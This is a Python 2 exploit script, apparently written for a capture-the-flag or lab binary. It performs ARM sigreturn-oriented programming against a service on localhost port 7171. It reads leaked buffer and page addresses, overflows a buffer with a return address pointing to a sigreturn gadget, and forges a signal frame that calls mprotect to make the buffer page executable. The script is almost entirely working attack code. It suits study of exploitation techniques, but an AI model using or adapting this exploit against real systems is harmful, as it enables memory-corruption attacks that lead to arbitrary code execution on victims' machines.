from struct import pack, unpack
from socket import create_connection
from Frame import SigreturnFrame
import string
import sys

PAGE_SIZE = 4096

SIGRETURN = 0x00008cb8
SVC = 0x00008cbc

SYS_MPROTECT  = 125

def myhexdump(a_string):
	i = 0
	line = ""
	while True:
		data = a_string[i*4: (i*4)+4]
		if not data: break
		line += "%08x " % (unpack("<I", (data))[0])
		i += 1
		if i % 4 == 0:
			print line
			line = ""

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data


s = create_connection(("localhost", 7171))
buffer_address = recv_n_bytes(s, 4)
buffer_address = unpack("<I", buffer_address)[0]
buffer_page    = buffer_address & ~(PAGE_SIZE - 1)
print "[+] Buffer address is", hex(buffer_address)

page = recv_n_bytes(s, 4)
page = unpack("<I", page)[0]
print "[+] mmap'd page address is", hex(page)

sploit  = ""
sploit += "A" * (0x30-28) + "B" * 4
sploit += pack("<I", SIGRETURN)

frame = SigreturnFrame(arch="arm")
frame.set_regvalue("uc_flags", 0x5ac3c35a)
#frame.set_regvalue("uc_link", buffer_page)
#frame.set_regvalue("uc_stack.ss_sp", buffer_page)
#frame.set_regvalue("uc_stack.ss_flags", buffer_page)
frame.set_regvalue("trap_no", 0x7)

frame.set_regvalue("r0", buffer_page)
frame.set_regvalue("r1", 0x1000)
frame.set_regvalue("r2", 0x7)
frame.set_regvalue("r3", 0x8)
frame.set_regvalue("r8", buffer_page)
frame.set_regvalue("r6", 0x10000)
frame.set_regvalue("r7", SYS_MPROTECT)
frame.set_regvalue("r8", buffer_page)
frame.set_regvalue("r10", buffer_page)
frame.set_regvalue("fp", buffer_page)
frame.set_regvalue("ip", 0x7fffffff)
frame.set_regvalue("sp", buffer_page)
frame.set_regvalue("lr", buffer_page)
frame.set_regvalue("pc", SVC)
frame.set_regvalue("cpsr", 0x40000010)
frame.set_regvalue("uc_regspace", 0xbefff444)
f = frame.get_frame()

if buffer_page % 8:
	">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>. OH SP NOOO!"

assert (buffer_page & ~(8-1)) == buffer_page

myhexdump(f)
sploit += f
sploit += "A" * (600-len(sploit))
s.send(sploit)
